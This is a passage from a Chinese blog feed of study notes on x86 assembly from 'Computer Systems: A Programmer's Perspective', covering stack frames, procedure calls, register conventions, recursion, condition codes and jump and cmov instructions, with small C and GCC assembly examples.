    <content type="html"><![CDATA[<p>这一节我们探讨过程调用[函数调用]是如何完成的。</p>
<h3 id="栈帧的结构"><a href="#栈帧的结构" class="headerlink" title="栈帧的结构"></a>栈帧的结构</h3><p>倘若我们要想搞清楚过程的实现，就必须先知道栈帧的结构是如何构成的。栈帧其实可以认为是程序栈的一段，而程序栈又是存储器的一段，因此栈帧说到底还是存储器的一段。那么既然是一段，肯定有两个端点。</p>
<p>这两个端点其实就是两个地址，<strong>一个标识着起始地址，一个标识着结束地址，而这两个地址，则分别存储在固定的寄存器当中，即起始地址存在%ebp寄存器当中，结束地址存在%esp寄存器当中</strong>。至于为什么要存在这两个寄存器当中，就像程序的下一条指令地址为什么存在PC当中一样，是毫无意义的问题，就是这样规定的，没有为什么。</p>
<p>起始地址和结束地址还有另外的名字，起始地址通常称为帧指针，结束地址通常称为栈指针（也就是栈顶的地址）。因此，我们就把过程的存储器内存使用区域称为栈帧。这下我们就了解了栈帧的来历以及它们的命名习惯和存储惯例，接下来的一幅图，它揭示了栈帧在存储器当中的位置。</p>
<p><img src="/images/汇编-25.png" alt="栈帧"></p>
<p>这个图基本上已经包括了程序栈的构成，它由一系列栈帧构成，这些栈帧每一个都对应一个过程，而且每一个帧指针+4的位置都存储着函数的返回地址，每一个帧指针指向的存储器位置当中都备份着调用者的帧指针。各位需要知道的是，每一个栈帧都建立在调用者的下方（也就是地址递减的方向），当被调用者执行完毕时，这一段栈帧会被释放。还有一点很重要的是，%ebp和%esp的值指示着栈帧的两端，而栈指针会在运行时移动，所以大部分时候，在访问存储器的时候会基于帧指针访问，因为在一直移动的栈指针无法根据偏移量准确的定位一个存储器位置。</p>
<p>　　还有一点比较重要的内容，就是栈帧当中内存的分配和释放。由于栈帧是向地址递减的方向延伸，因此如果我们将栈指针减去一定的值，就相当于给栈帧分配了一定空间的内存。这个理解起来很简单，因为在栈指针向下移动以后（也就是变小了），帧指针和栈指针中间的区域会变长，这就是给栈帧分配了更多的内存。相反，如果将栈指针加上一定的值，也就是向上移动，那么就相当于压缩了栈帧的长度，也就是说内存被释放了。<strong>需要注意的是，上面的一切内容，都基于一个前提，那就是帧指针在过程调用当中是不会移动的。</strong></p>
<h3 id="过程的实现"><a href="#过程的实现" class="headerlink" title="过程的实现"></a>过程的实现</h3><p>过程虽然很好，但想要实现过程，还是存在一定难度的，尽管现在看来它并不困难。<strong>它实现的难度主要就在于数据如何在调用者和被调用者之间传递，以及在被调用者当中局部变量内存的分配以及释放。</strong></p>
<p>不过天大的难题都难不倒那群计算机界的大神们，他们找出了一种方式，可以简单并有效的处理过程实现当中的难题。这一切似乎看起来十分偶然，但其实也是必然的。世间的很多规律都是客观存在的，只是它在等着我们去发现而已。</p>
<p>总的来说，过程实现当中，<code>参数传递</code>以及<code>局部变量内存的分配和释放</code>都是通过以上介绍的栈帧来实现的，大部分情况下，我们认为过程调用当中做了以下几个操作。</p>
<p>1、备份原来的帧指针，调整当前的帧指针到栈指针的位置，这个过程就是我们经常看到的如下两句汇编代码做的事情。</p>
<pre><code>pushl    %ebp
movl    %esp, %ebp
</code></pre><p>2、建立起来的栈帧就是为被调用者准备的，当被调用者使用栈帧时，需要给临时变量分配预留内存，这一步一般是经过下面这样的汇编代码处理的。</p>
<pre><code>subl    $16,%esp
</code></pre><p>3、备份被调用者保存的寄存器当中的值，如果有值的话，备份的方式就是压入栈顶。因此会采用如下的汇编代码处理。</p>
<pre><code>pushl    %ebx
</code></pre><p>4、使用建立好的栈帧，比如读取和写入，一般使用mov，push以及pop指令等等。</p>
<p>5、恢复被调用者寄存器当中的值，这一过程其实是从栈帧中将备份的值再恢复到寄存器，不过此时这些值可能已经不在栈顶了。因此在恢复时，大多数会使用pop指令，但也并非一定如此。</p>
<p>6、释放被调用者的栈帧，释放就意味着将栈指针加大，而具体的做法一般是直接将栈指针指向帧指针，因此会采用类似下面的汇编代码处理（也可能是addl）。</p>
<pre><code>movl    %ebp,%esp
</code></pre><p>7、<strong>恢复调用者的栈帧，恢复其实就是调整栈帧两端，使得当前栈帧的区域又回到了原始的位置</strong>。因为栈指针已经在第六步调整好了，因此此时只需要将备份的原帧指针弹出到%ebp即可。类似的汇编代码如下。</p>
<pre><code>popl    %ebp
</code></pre><p>8、弹出返回地址，跳出当前过程，继续执行调用者的代码。<strong>此时会将栈顶的返回地址弹出到PC，然后程序将按照弹出的返回地址继续执行。这个过程一般使用<code>ret指令</code>完成。</strong></p>
<p>过程的实现大概就是以上八个步骤组成的，不过这些步骤并不都是必须的（大部分时候，开启编译器的优化会优化掉很多步骤），而且第6和第7步有时会使用leave指令代替。</p>
<h3 id="过程相关指令：call、leave、ret"><a href="#过程相关指令：call、leave、ret" class="headerlink" title="过程相关指令：call、leave、ret"></a>过程相关指令：call、leave、ret</h3><p>由于过程调用当中会经常见到几个新的指令，因此在这里，先给大家介绍一下这三个指令。它们三个都是过程实现当中非常重要的角色，这三个指令很类似，因为它们都是<strong>一个指令做了两件事</strong>，这里就依次介绍一下它们各自都做了什么事。</p>
<ul>
<li><p>call指令：它一共做两件事，第一件是将返回地址（也就是call指令执行时PC的值）压入栈顶，第二件是将程序跳转到当前调用的方法的起始地址。第一件事是为了为过程的返回做准备，而第二件事则是真正的指令跳转。</p>
</li>
<li><p>leave指令：它也是一共做两件事，第一件是将栈指针指向帧指针，第二件是弹出备份的原帧指针到%ebp。第一件事是为了释放当前栈帧，第二件事是为了恢复调用者的栈帧。</p>
</li>
<li><p>ret指令：它同样也是做两件事，第一件是将栈顶的返回地址弹出到PC，第二件事则是按照PC此时指示的指令地址继续执行程序。这两件事其实也可以认为是一件事，因为第二件事是系统自己保证的，系统总是按照PC的指令地址执行程序。</p>
</li>
</ul>
<p>可以看出，除了call指令之外，leave和ret指令都与上面8个步骤有些不可分割的关系。call指令没有在8个步骤当中体现，是因为它发生在进入过程之前，因此在第1步发生的时候，call指令往往已经被执行了，并且已经为ret指令准备好了返回地址。</p>
<h3 id="寄存器使用的规矩"><a href="#寄存器使用的规矩" class="headerlink" title="寄存器使用的规矩"></a>寄存器使用的规矩</h3><p>寄存器一共就8个，因此在数目上来说的话，使用起来肯定是捉襟见肘的。在这种情况下，就肯定需要一定的规矩去约束程序如何使用，否则要是一群人翻同一个人的牌子，那到底伺候谁才是呢。其实我们在之前已经或多或少的接触到了寄存器的规矩，比如%eax一般用于存储过程的返回值，%ebp保存帧指针，%esp保存栈指针。这里要介绍的，是另外一个规矩，而这个规矩是与过程实现相关的。</p>
<p>试想一下，在调用一个过程时，无论是调用者还是被调用者，都可能更新寄存器的值。假设调用者在%edx中存了一个整数值100，而被调用者也使用这个寄存器，并更新成了1000，于是悲剧就发生了。当过程调用完毕返回后，调用者再使用%edx的时候，值已经从100变成了1000，这几乎必将导致程序会错误的执行下去。</p>
<p>为了避免上面这种情况发生，就需要在调用者和被调用者之间做一个协调。于是便有了这样的规矩，它的描述如下，我们假设这里在过程P中调用了过程Q，P是调用者，Q是被调用者。</p>
<ul>
<li><p><code>%eax、%edx、%ecx</code>：这三个寄存器被称为调用者保存寄存器。意思就是说，这三个寄存器由调用者P来保存，而对于Q来说，Q可以随便使用，用完了就不用再管了。</p>
</li>
<li><p><code>%ebx、%esi、%edi</code>：这三个寄存器被称为被调用者保存寄存器。同样的，这里是指这三个寄存器由被调用者Q来保存，换句话说，Q可以使用这三个寄存器，但是如果里面有P的变量值，Q必须保证使用完以后将这三个寄存器恢复到原来的值，这里的备份，其实就是上面那8个步骤中第3个步骤做的事情。</p>
</li>
</ul>
<h3 id="一个过程示例"><a href="#一个过程示例" class="headerlink" title="一个过程示例"></a>一个过程示例</h3><p>进过上面纸上谈兵的阶段，接下来我们就要探索真理了，我们随便写一个如下的过程调用的例子，我们称它为function.c。</p>
<pre><code>int add(int a,int b){
   register int c = a + b; 
   return c;
}

int main(){
   int a = 100;
   int b = 101;
   int c = add(a,b);
   return c;
}
</code></pre><p>这里为了完整的展现那8个步骤，因此给变量c加了register关键字修饰，这将会将c送入寄存器，从而更改被调用者保存寄存器，就会导致步骤3的发生。接下来我们就使用参数-S来编译这段代码，然后使用cat来看看这段代码的汇编形式。以下是main函数以及add函数各自的栈帧情况，贴心的我已经详细标记了它们属于哪个步骤。</p>
<p><img src="/images/汇编-26.png" alt="过程调用"></p>
<p><img src="/images/汇编-27.png" alt="过程调用"></p>
<p>由于我们没有使用编译优化，因此汇编代码会多出很多，这也为了完整的诠释我们的步骤。可以看到，图中包含了完整的8个步骤，但是无论是main函数还是add函数，它们单独来讲，都没有完整的8个步骤，这其实是大多数的情况。大部分时候，一个函数不会完全包含上述的8个步骤。</p>
<p>这里有几点各位需要注意的地方，首先第一点是，add函数会将返回结果存入%eax（前提是返回值可以使用整数来表示），在main函数中，call指令之后，默认将%eax作为返回结果来使用。第二点是，所有函数（包括main函数）都必须有第1步和第6、7、8步，这是必须的4步。最后一点是，我们的栈指针和帧指针有固定的大小关系，即栈指针永远小于等于帧指针，当二者相等时，当前栈帧被认为没有分配内存空间。</p>
<h3 id="递归过程调用"><a href="#递归过程调用" class="headerlink" title="递归过程调用"></a>递归过程调用</h3><p>接下来我们看一个特殊的过程调用–递归是怎么实现的。</p>
<p>看一个递归求和的例子：</p>
<pre><code>int rfact(int n){
    int result;
    if(n&lt;=1){
        result = 1;
    }else{
        result = n * rfact(n-1);
    }
    return result;
}
</code></pre><p>接下来我们编译一下这段代码，使用-O1优化，我们可以得到如下的汇编代码。</p>
<p><img src="/images/汇编-29.png" alt="汇编代码"></p>
<p>如果理解了过程调用的机制，不难读懂这个递归调用的例子，但是难点就在于，栈帧的变化是如何的，贴心的我就给各位演示一下栈帧的变化过程，如果各位已经把前面的那个main函数和add函数搞定了，那么可以在这里验证一下自己的理解是否正确。</p>
<p><img src="/images/汇编-28.png" alt="递归调用"></p>
<p>需要特殊说明的是，以上每一个栈帧（大括号括起来的），最上面（也就是地址递增方向）的都是帧指针位置，最下面的都是栈指针位置。然而寄存器中只有%ebp和%esp保存栈帧指针，因此同一时间只能保存一对。当进展到第三层的时候，已经有了三个栈帧（原则上来讲一定是多于3个），寄存器当然是存不下的，因此就需要在存储器当中备份一下，之后再恢复。于是就出现了每个栈帧的帧指针指向的存储器位置，都会备份着外层方法（也就是调用者）的帧指针。</p>
<p>当方法递归到n=1结束时，栈帧会自下向上依次收回，栈帧指针（也就是%ebp和%esp当中的值）都会依次向上移动，直到程序结束。也就是说，上面的三幅图，如果倒过来，就是递归方法依次结束时栈帧的状态。</p>
<p>由此就可以看出，过程当中栈帧建立以及完成的惯例，可以保证递归调用的正常运行，包括循环调用。不得不说，这群计算机界的大神们实在是太牛了，尽管当栈帧出现以后，看起来也并不复杂，但难点就在于<code>无中生有的发现或者说某种意义上的创造</code>。</p>
<p>文章内容来自：<a href="http://www.cnblogs.com/zuoxiaolong/p/computer19.html" target="_blank" rel="external">深入理解计算机系统（3.7）—汇编世界当中过程的经典（十分重要）（难度较高）</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这一节我们探讨过程调用[函数调用]是如何完成的。&lt;/p&gt;
&lt;h3 id=&quot;栈帧的结构&quot;&gt;&lt;a href=&quot;#栈帧的结构&quot; class=&quot;headerlink&quot; title=&quot;栈帧的结构&quot;&gt;&lt;/a&gt;栈帧的结构&lt;/h3&gt;&lt;p&gt;倘若我们要想搞清楚过程的实现，就必须先知道栈帧的结构
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-4</title>
    <link href="http://yoursite.com/2018/05/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-4/"/>
    <id>http://yoursite.com/2018/05/08/深入理解计算机系统-汇编的世界-4/</id>
    <published>2018-05-07T17:28:03.000Z</published>
    <updated>2018-05-07T16:13:07.257Z</updated>
    
    <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>本章我们来看一个特别有趣的内容，就是汇编级别的语言，如何利用寄存器实现if/for/while这些高级语言的流程控制，我相信你能感受到它的神奇之处。</p>
<h3 id="条件码寄存器"><a href="#条件码寄存器" class="headerlink" title="条件码寄存器"></a>条件码寄存器</h3><p>在汇编层面，if/for/while的流程控制，都是通过跳转来实现的，那是怎么判断是否跳转的呢？ <code>条件寄存器</code></p>
<table>
<thead>
<tr>
<th>寄存器</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>CF (Carry Flag)</td>
<td>进位标志寄存器，它记录无符号操作的溢出，当溢出时会被设为1</td>
</tr>
<tr>
<td>ZF (Zero Flag)</td>
<td>零标志寄存器，当计算结果为0时将会被设为1</td>
</tr>
<tr>
<td>SF (Sign Flag)</td>
<td>符号标志寄存器，当计算结果为负数时会被设为1</td>
</tr>
<tr>
<td>OF (Overflow Flag)</td>
<td>溢出标志寄存器，当计算结果导致了补码溢出时，会被设为1</td>
</tr>
</tbody>
</table>
<p>从上面寄存器的简单说明可以看出，ZF和SF可以判断结果的符号，而CF和OF可以判断无符号和补码的溢出。而我们平时使用的高级程序语言，就仅仅靠这四个寄存器和跳转指令，就可以演化出千变万化的流程控制，再一次感叹汇编设计者的伟大。</p>
<h3 id="改变条件码寄存器的值"><a href="#改变条件码寄存器的值" class="headerlink" title="改变条件码寄存器的值"></a>改变条件码寄存器的值</h3><p>通常情况下，条件码寄存器的值无法主动被改变，它们大多时候是被动改变，这算是条件码寄存器的特色。这其实理解起来并不困难，因为条件码寄存器是1位的，而我们的数据格式最低为b，也就是8位，因此你无法使用任何数据传送指令去传送一个单个位的值。</p>
<p>几乎所有的算术与逻辑指令都会改变条件码寄存器的值，不过改变的前提是触发了条件码寄存器的条件。比如对于<code>subl %edx,%eax</code>这个减法指令，假设<code>%edx</code>和<code>%eax</code>寄存器的值都为<code>0x10</code>，则两者相减的结果为0，此时ZF寄存器将会被自动设为1。对于其它的指令运算，都是类似的，会根据结果的不同而设置不同的条件码寄存器。</p>
<h3 id="特殊的测试指令"><a href="#特殊的测试指令" class="headerlink" title="特殊的测试指令"></a>特殊的测试指令</h3><p>在进行算术与逻辑操作时，条件码寄存器的值可能随之改变。这里介绍两个比较特别的测试指令，它们不改变普通寄存器或者存储器的值，只是为了设置条件码寄存器的值。这算是唯二两个可以主动设置条件码寄存器的指令，它们分别是cmp以及test指令。</p>
<p>cmp是compare的意思，它有两个操作数，比如cmp S2，S1，最终会基于S1-S2的值去设置条件码寄存器的值。而对于test来说是类似的，对于test S2，S1来说，它将基于S1&amp;S2去设置条件码寄存器的值。另外需要一提的是，两者都需要加数据格式后缀，比如b、w、l这些后缀。</p>
<p>举个简单的例子，对于cmpl %edx，%eax这个指令来讲，假设%edx的值为y，%eax的值为x。则当x=y时，ZF将会被置为1。当x<y时，sf将会被置为1。而当x>y时，ZF和SF将同时为0。对于test指令来讲，则相对特别一点，它经常用于判断一个数是正数、负数，或者是0。当test用来判断一个数的正负零时，两个操作数为同一个，也就是说testl %eax，%eax可以用来判断%eax寄存器当中的值是正数、负数还是0。因此testl %eax，%eax就相当于cmpl $0，%eax这个指令。</y时，sf将会被置为1。而当x></p>
<p>对于testl %eax，%eax这个指令，或许有的猿友会比较容易蒙，想不明白它如何判断一个数到底是正是负还是零。其实这个道理是非常简单的，只是有时候会一时转不过来，当两个操作数相同时，则经过“与运算”以后还是它自身。此时系统会根据计算结果去设置条件码，而结果又是它自身，因此其实就相当于根据这个数的正负零去设置条件码，这样就可以判断出这个数的正负了。就像cmpl $0，%eax一样，在减去0之后，还是它自身，然后根据自身的正负零去设置条件码寄存器。</p>
<h3 id="访问条件码寄存器"><a href="#访问条件码寄存器" class="headerlink" title="访问条件码寄存器"></a>访问条件码寄存器</h3><p>对于普通寄存器来讲，使用的时候一般是直接读取它的值，而对于条件码寄存器来说，则不一定非要读取它的值才能使用。对于条件码寄存器来讲，有三种使用方式，都可以让它发挥作用。</p>
<ul>
<li>可以根据条件码寄存器的某个组合，将一个字节设置为0或1，其实这个就相当于读值。</li>
<li>可以直接条件跳转到程序的某个其它的部分。</li>
<li>可以有条件的传送数据。</li>
</ul>
<p>其中第一种方式涉及到<code>SET</code>指令，只用一个目的操作数，一条<code>SET</code>指令的目的操作数是8个单字节寄存器元素之一，或是存储一个字节的存储器位置，将这个字节设置成0或1。所以第一种方式其实就是普通寄存器的用法，直接读取条件码寄存器的值，然后进行使用。对于第二和第三种来说，就不是这样了，它们不会显示的读取条件码寄存器的值，而是直接使用。</p>
<h4 id="SET指令"><a href="#SET指令" class="headerlink" title="SET指令"></a>SET指令</h4><p><img src="/images/汇编-20.png" alt="SET指令"></p>
<p>对于<code>setae %al</code>指令来说，<code>%al</code>是<code>%eax</code>寄存器中的最后一个字节，这个指令的含义是，将<code>~CF</code>的值设置到<code>%eax</code>寄存器的最后一个字节。</p>
<h3 id="条件码寄存器的组合"><a href="#条件码寄存器的组合" class="headerlink" title="条件码寄存器的组合"></a>条件码寄存器的组合</h3><p>条件码寄存器的组合是执行跳转的重要判断依据，如何将条件码寄存器的组合与条件联系起来。</p>
<p>首先要说明的一点是，对于所有的组合都基于a-b这样的前提，也就是说条件码寄存器的值是经过了一个减运算设置后的值。例如，对于【e-&gt;ZF】这样的形式，代表的意思是字母e作为后缀时，则以ZF的值为1视为条件成立。</p>
<h3 id="条件跳转指令：jmp指令"><a href="#条件跳转指令：jmp指令" class="headerlink" title="条件跳转指令：jmp指令"></a>条件跳转指令：jmp指令</h3><p>这个指令是我们程序实现流程控制的关键指令，它可以直接将程序跳转到指定的位置，又或者根据条件码寄存器的组合进行条件跳转。</p>
<p><img src="/images/汇编-21.png" alt="jmp指令"></p>
<p>可以看到，除了两个jmp指令之外，其余指令均是由j与条件码的组合组成的，因此除了第一个jmp直接跳转指令以及第二个jmp间接跳转指令之外，剩下的12个都是条件跳转指令，它们基于条件码寄存器的组合进行跳转。</p>
<p>总的来说，跳转指令的地址编码一般有两种，第一种是基于PC的，第二种则是绝对地址。基于PC（程序计数器）则是指给出一个偏移量，这个偏移量基于当前下一条指令的地址，也就是PC当中的值，这是一种最常用的方式。绝对地址则比较简单，它将直接给出存储器当中代码的位置。</p>
<p>比如我们最容易理解的je指令，它代表的是“相等则跳转”。j是跳转的意思，e则是条件码的组合，代表英文equals，因为我们基于a-b去设置条件码寄存器，因此当ZF为1时，代表a等于b。因此ZF条件码寄存器就是相等的条件码组合，而je就代表相等则跳转，就像if(a==b){block}这样的代码所代表的意思。</p>
<ul>
<li><p>e-&gt;ZF（相等）：e是equals的意思。这里代表的组合是ZF，因为ZF在结果为0时设为1，即a-b=0，也就是说a==b。因此ZF代表的意义是相等。</p>
</li>
<li><p>ne-&gt;~ZF（不相等）：ne是not equals的意思。这里代表的组合是~ZF，也就是ZF做“非运算”，则很明显是不相等的意思。</p>
</li>
<li><p>s-&gt;SF（负数）：s这里没什么实际意义，因为负数的直译是negative number，首字母是n，这与not的首字母重复了，因此这里就取了SF条件码寄存器的首个字母（纯属LZ的猜测，无权威证明，不过LZ自我感觉应该八九不离十，0.0）。这里代表的组合是SF，因为SF在计算结果为负数时设为1，此时可以认为b为0，即a&lt;0。因此这里是负数的意思。</p>
</li>
<li><p>ns-&gt;~SF（非负数）：与s相反，加上n则是not的意思，因此这里代表非负数。</p>
</li>
<li><p>l-&gt;SF^OF（有符号的小于）：l代表的是less。这里的组合是SF^OF，即对SF和OF做“异或运算”。“异或运算”的意思则是代表，SF和OF不能相等。那么有两种情况，当OF为0时，则代表没有溢出，此时SF必须为1，SF为1则代表结果为负。即a-b&lt;0，也就是a&lt;b，也就是小于的意思。当OF为1时，则代表产生了溢出，而此时SF必须为0，也就是说结果最后为正数，那么此时则是负溢出，也可以得到a-b&lt;0，即a&lt;b。综合前面两种情况，SF^OF则代表小于的意思。</p>
</li>
<li><p>le-&gt;(SF^OF)|ZF（有符号的小于等于）：le是less equals的意思。有了前面小于的基础，这里就很容易理解了。SF^OF代表小于，ZF代表等于，因此两者的“或运算”则代表小于等于。</p>
</li>
<li><p>g-&gt;~(SF^OF)&amp;~ZF（有符号的大于）：g是greater的意思。这里的组合是~(SF^OF)&amp;~ZF，相对来说就比较复杂了。不过有了前面的铺垫，这个也非常好理解。SF^OF代表小于，则~(SF^OF)代表大于等于，而~ZF代表不等于，将~(SF^OF)与~ZF取“与运算”，则代表大于等于且不等于，也就是大于。</p>
</li>
<li><p>ge-&gt;~(SF^OF)（有符号的大于等于）：ge是greater equals的意思。这个组合就不需要再解释了吧。</p>
</li>
<li><p>b-&gt;CF（无符号的小于）：b是below的意思。CF是无符号溢出标志，这里的意思是指如果a-b结果溢出了，则代表a是小于b的，即a&lt;b。其实这个结论很显然，关键点就在于，无符号减法只有在减出负数的时候才可能溢出，也就是说只要结果溢出了，那么一定有a-b&lt;0。因此这个结论就显而易见了。</p>
</li>
<li><p>be-&gt;CF|ZF（无符号的小于等于）：这里是below equals的意思。因此这里会与ZF计算“或运算”，字面上也很容易理解，即CF（小于）|（或）ZF（等于），也就是小于等于。</p>
</li>
<li><p>a-&gt;~CF&amp;~ZF（无符号的大于）：a代表的是above。这个组合也是非常好理解的，CF代表小于，则~CF代表大于等于，~ZF代表不等于，因此~CF&amp;~ZF则代表大于等于且不等于，即大于。</p>
</li>
<li><p>ae-&gt;~CF（无符号的大于等于）：ae是above equals的意思。至于这个组合的意义，相信也不需要解释了吧。</p>
</li>
</ul>
<p>以上则是几乎所有的条件码寄存器组合，如果你完全理解了上面的组合，那么接下来的一系列指令会非常简单。它们只是基于条件码的组合，进行设值、跳转、传送的操作而已。从形式上来讲，上面这些组合与数据格式中的b、w、l的用法非常相似。</p>
<h4 id="基于PC的偏移量寻址"><a href="#基于PC的偏移量寻址" class="headerlink" title="基于PC的偏移量寻址"></a>基于PC的偏移量寻址</h4><p>相信大部分都听说过这样的说法，PC（程序计数器）会一直指向程序的下一条指令，因此这里所说的PC的相对位置，则是指跳转指令会附带一个偏移量，而这个偏移量与PC值的和则刚好指向跳转的位置。为了理解起来简单，这里举个简单的例子，我们考虑下面一段代码，这是一个非常简单的取两数最小值的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">int min(int a,int b)&#123;</div><div class="line">    if( a &lt; b )&#123;</div><div class="line">        return a;</div><div class="line">    &#125;else&#123;</div><div class="line">        return b;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们将其命名为jmp.c，并使用-O1和-S参数去编译它，我们将会得到以下汇编代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">	.file	&quot;jmp.c&quot;</div><div class="line">	.text</div><div class="line">	.globl	min</div><div class="line">	.type	min, @function</div><div class="line">min:</div><div class="line">.LFB0:</div><div class="line">	.cfi_startproc</div><div class="line">	pushl	%ebp</div><div class="line">	.cfi_def_cfa_offset 8</div><div class="line">	.cfi_offset 5, -8</div><div class="line">	movl	%esp, %ebp</div><div class="line">	.cfi_def_cfa_register 5</div><div class="line">	movl	8(%ebp), %eax</div><div class="line">	cmpl	12(%ebp), %eax</div><div class="line">	jge	.L2</div><div class="line">	movl	8(%ebp), %eax   </div><div class="line">	jmp	.L3</div><div class="line">.L2:</div><div class="line">	movl	12(%ebp), %eax</div><div class="line">.L3:</div><div class="line">	popl	%ebp</div><div class="line">	.cfi_restore 5</div><div class="line">	.cfi_def_cfa 4, 4</div><div class="line">	ret</div><div class="line">	.cfi_endproc</div><div class="line">.LFE0:</div><div class="line">	.size	min, .-min</div><div class="line">	.ident	&quot;GCC: (Ubuntu 4.8.4-2ubuntu1~14.04.4) 4.8.4&quot;</div><div class="line">	.section	.note.GNU-stack,&quot;&quot;,@progbits</div></pre></td></tr></table></figure>
<p>经过前面的学习，不难看懂上面的汇编代码。其中a和b分别存储在栈顶+8和+12的位置，<code>cmpl    12(%ebp), %eax</code>比较 <code>a-b</code>的结果，如果<code>a&gt;=b</code>，就跳转到 .L2,执行<code>movl    12(%ebp), %eax</code>把b的值放到寄存器<code>%eax</code>中，作为函数返回值；如果<code>a&lt;b</code>则不跳转，执行<code>movl    8(%ebp), %eax</code>把a的值放到寄存器<code>%eax</code>中，作为函数返回值,然后<code>jmp</code>无条件跳转到 .L3 。可以看到，在汇编代码当中，<code>jmp族指令</code>会使用标签指示跳转地址，比如上面出现过的<code>.L2</code>、<code>.L3</code>。</p>
<p>不过经过汇编器处理之后，标签将不会再存在，此时会使用上面所说的PC偏移量记录跳转地址。接下来，我们看一下这个<code>偏移量寻址</code>的方式。我们可以使用-O1和-c编译jmp.c，并使用objdump加-d参数去查看jmp.o，这样会得到下面的反汇编代码。</p>
<p><img src="../images/汇编-22.png" alt="反汇编代码"></p>
<p>可以看到，这里面的指令序列与刚才的一模一样，因为我们采取了同样的优化等级-O1。值得注意的是，在第<code>0x9</code>行的指令<code>jge    10 &lt;min+0x10&gt;</code>中，跳转的偏移地址是<code>0x10</code>，也就是<code>mov    0xc(%ebp),%eax</code>,其实这个地址是通过偏移量计算出来的。作为暖男的我，已经在图上圈出来了，在指令的<code>jge    10</code>二进制序列<code>7d 05</code>中,<code>7d</code>指的是指令<code>jge</code>,<code>05</code>指的是操作数，此时的<code>pc</code>值是<code>0xb</code>。请切记<strong>PC（程序计数器）会一直指向程序的下一条指令</strong>，所以指令<code>jge</code>的跳转地址为<code>0x05+0xb = 0x10</code>,正是指令<code>mov    0xc(%ebp),%eax</code>。</p>
<p>为了证明这一点，我们可以使用hexdump加-C参数查看jmp.o。</p>
<p><img src="/images/汇编-23.png" alt="hexdump查看"></p>
<p>这下比较清楚了吧，当碰到<code>7d</code>指令（即jle）时，会检查后面的偏移量，结果一看是<code>0x05</code>，于是在条件满足的前提下，会跳过5个字节执行接下来的指令，也就是<code>8b 45 0c</code>（即mov指令）。</p>
<h3 id="条件传送指令：cmov指令"><a href="#条件传送指令：cmov指令" class="headerlink" title="条件传送指令：cmov指令"></a>条件传送指令：cmov指令</h3><p>接下来我们来看最后一种条件指令，叫做条件传送指令。顾名思义，条件传送指令的意思就是在满足条件的时候进行传送的指令，也就是cmov指令。它与set指令十分相似，同样有12种，也就是加上12种条件码寄存器的组合即可，以下是一张书中的指令表格。</p>
<p><img src="/images/汇编-24.png" alt="cmov指令"></p>
<p><a href="http://www.cnblogs.com/zuoxiaolong/p/computer18.html" target="_blank" rel="external">深入理解计算机系统（3.6）—汇编中精妙的流程控制（重要）（难度较高）</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h3&gt;&lt;p&gt;本章我们来看一个特别有趣的内容，就是汇编级别的语言，如何利用寄存器实现if/for/while这些高级语言的流程控制，我相信你能感受到它的神
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-3</title>
    <link href="http://yoursite.com/2018/05/07/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-3/"/>
    <id>http://yoursite.com/2018/05/07/深入理解计算机系统-汇编的世界-3/</id>
    <published>2018-05-06T20:43:50.000Z</published>
    <updated>2018-05-06T14:10:08.003Z</updated>
    
    <content type="html"><![CDATA[<h3 id="算术与逻辑运算指令"><a href="#算术与逻辑运算指令" class="headerlink" title="算术与逻辑运算指令"></a>算术与逻辑运算指令</h3><p>算术与逻辑运算包括很多种，估计各位猿友也能很快的想出来，比如最常见的加减乘除、与或非、左移右移等等。不过还有一个很神奇的指令 <code>leal</code>。</p>
<p><img src="/images/汇编-13.png" alt="算术与逻辑运算指令"></p>
